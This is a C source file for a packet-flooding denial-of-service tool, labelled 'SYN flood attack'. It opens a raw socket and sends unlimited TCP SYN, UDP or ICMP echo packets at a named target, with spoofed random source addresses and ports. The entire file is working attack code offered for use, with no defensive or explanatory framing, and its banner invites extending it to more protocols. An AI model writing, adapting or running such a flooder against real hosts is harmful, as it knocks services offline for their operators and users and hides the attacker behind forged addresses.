// date:17.4.4
// author: linyang <942510346@qq.com>
// 512 SYN洪流攻击


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>

#ifndef __FAVOR_BSD
#define __FAVOR_BSD
#endif
#include <netinet/udp.h>
#include <netinet/tcp.h>

#define ICMP_HEADER_LEN 8
// define some global variables
u_short g_dstport, g_srcport;
u_long g_dstaddr, g_srcaddr, g_pcount;
int g_protype, g_sock;

// pseudo header. per rfc 793
struct pseudo_hdr
{
	u_long saddr, daddr;	// src and dst address
	u_char mbz, ptcl;		// zero and protocol
	u_short protolen;		// tcp/upd length
};

struct packet //format packet to send
{
	struct iphdr ip;
	union {
		struct tcphdr tcp;
		struct udphdr udp;
		struct icmp icmp;
	} u;
	u_char data[0];
};

struct checksum {
	struct pseudo_hdr pseudo;
	union {
		struct tcphdr tcp;
		struct udphdr udp;
		struct icmp icmp;
	} h;
};

void usage(char *pname)
{
	printf("usage: %s <protocol> <dstaddr> <pcount> <srcaddr> <dstport> <srcport>\n" 
		   " protocol	- tcp/udp/icmp.\n"
		   " dstaddr 	- the target we are trying to send.\n"
		   " pcount 	- the count we are trying to send(unlimited default).\n"
		   " srcaddr 	- spoofed source address(random default).\n"
		   " dstport 	- TCP/UDP port (random default). \n"
		   " srcport 	- spoofed source TCP port(random default).\n",  pname);

	exit(1);
}


u_short in_cksum(u_short *addr, int len)
{
	u_short cksum;
	int sum = 0;

	while (len > 1) {
		sum += *addr++;
		len -= 2;
	}

	if (len == 1) {
		sum += *(unsigned char *)addr;
	}
	sum = (sum >> 16) + (sum & 0xffff); // add high 16 to low 16;
	sum += (sum >> 16);					// add carry
	cksum = ~sum;

	return (cksum);
}

u_long lookupbyname(char* hostname)
{
	struct hostent *hp;

	if ((hp = gethostbyname(hostname)) == NULL) {
		printf("could not resolve %s.\n", hostname);
		exit(-3);
	}

	return *(u_long *)hp->h_addr;
}

void flooder_attack()
{
	struct packet packet;
	u_short dstport = 0, srcport = 0;
	u_long srcaddr = 0;
	struct checksum *cksum  = (struct checksum *)((char *)&packet + sizeof(struct iphdr) - sizeof(struct pseudo_hdr));
	struct sockaddr_in s_in;
	u_long i, psize;

	for (i = 0; g_pcount ? (i < g_pcount) : !g_pcount; ++i) {
		memset(&packet, 0, sizeof(packet));
		if (!g_srcaddr)
			srcaddr = random();
		else
			srcaddr = g_srcaddr;
		if (!g_srcport)
			srcport = random();
		else
			srcport = g_srcport;
		if (!g_dstport)
			dstport = random();
		else
			dstport = g_dstport;
		cksum -> pseudo.daddr = g_dstaddr;
		cksum -> pseudo.saddr = g_srcaddr;
		cksum -> pseudo.mbz = 0;
		cksum -> pseudo.ptcl = g_protype;
		psize = sizeof(struct iphdr);
		switch (g_protype) {
			case IPPROTO_TCP:	// format tcp packet
				packet.u.tcp.th_win = htons(16348);
				packet.u.tcp.th_seq = random();
				packet.u.tcp.th_ack = 0;
				packet.u.tcp.th_off = 5;
				packet.u.tcp.th_urp = 0;
				packet.u.tcp.th_flags = TH_SYN;
				packet.u.tcp.th_sport = srcport;
				packet.u.tcp.th_dport = dstport;
				cksum -> pseudo.protolen = htons(sizeof(struct tcphdr));
				packet.u.tcp.th_sum = in_cksum((u_short *)cksum,
					sizeof(struct checksum));
				psize += sizeof(struct tcphdr);
				break;
			case IPPROTO_UDP:	// format udp packet
				packet.u.udp.uh_sport = srcport;
				packet.u.udp.uh_dport = dstport;
				packet.u.udp.uh_ulen = htons(sizeof(struct udphdr));
				cksum -> pseudo.protolen = htons(sizeof(struct udphdr));
				packet.u.udp.uh_sum = in_cksum((u_short *)cksum,
					sizeof(struct checksum));
				psize += sizeof(struct udphdr);
				break;
			case IPPROTO_ICMP:
				packet.u.icmp.icmp_type = ICMP_ECHO;
				packet.u.icmp.icmp_code = 0;
				packet.u.icmp.icmp_cksum = 0;
				packet.u.icmp.icmp_seq = i;
				packet.u.icmp.icmp_id = 0;
				packet.u.icmp.icmp_cksum = in_cksum((u_short *)
					&packet.u.icmp, ICMP_HEADER_LEN);
				psize += ICMP_HEADER_LEN;
				break;
			default:
				printf("no such protocol\n");

		}
		packet.ip.ihl = 5;
		packet.ip.version = 4;
		packet.ip.protocol = g_protype;
		packet.ip.tos = 0x80;
		packet.ip.id =  random();
		packet.ip.tot_len = htons(sizeof(packet));
		packet.ip.frag_off = 0;
		packet.ip.ttl = 255;
		packet.ip.daddr = g_dstaddr;
		packet.ip.saddr = srcaddr;
		packet.ip.check = 0;
		packet.ip.check = in_cksum((u_short *)&packet.ip, sizeof(struct iphdr));

		s_in.sin_family = AF_INET;
		s_in.sin_port = htons(dstport);
		s_in.sin_addr.s_addr = g_dstaddr;
		if (sendto(g_sock, &packet, psize, 0, (struct sockaddr *)&s_in, sizeof(s_in)) < 0)
			perror("sendto()");
	}
}

int main(int argc, char const *argv[])
{
	int on = 1;
	printf("--------TCP/UDP/ICMP Flood---------\n"
		   "so far supprot TCP/UDP/ICMP and you could add into \n"
		   "more packet types, including RIP, BGP etc..\n"
		   "just modify the source code and get it recompiled\n");

	if (argc < 3 || argc > 7)
		usage(argv[0]);
	if (!strcasecmp("udp", argv[1]))
		g_protype = IPPROTO_UDP;
	else if (!strcasecmp("tcp", argv[1]))
		g_protype = IPPROTO_TCP;
	else if (!strcasecmp("icmp", argv[1]))
		g_protype = IPPROTO_ICMP;
	else
		usage(argv[0]);
	srand(time(NULL));

	g_dstaddr = lookupbyname(argv[2]);
	if (argc > 3)
		g_pcount = atoi(argv[3]);
	if (argc > 4)
		g_srcaddr = lookupbyname(argv[4]);
	if (argc > 5)
		g_dstport = atoi(argv[5]);
	if (argc > 6)
		g_srcport = atoi(argv[6]);

	// creating a raw socket
	if ((g_sock  = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		perror("socket()");
		exit(-1);
	}

	// set socket options
	if (setsockopt(g_sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0) {
		perror("setsockopt()");
		exit(-2);
	}

	printf("starting send %s packets!\n", argv[1]);
	flooder_attack();	// flooder packets send
	printf("stop send packets\n");

	return 0;
}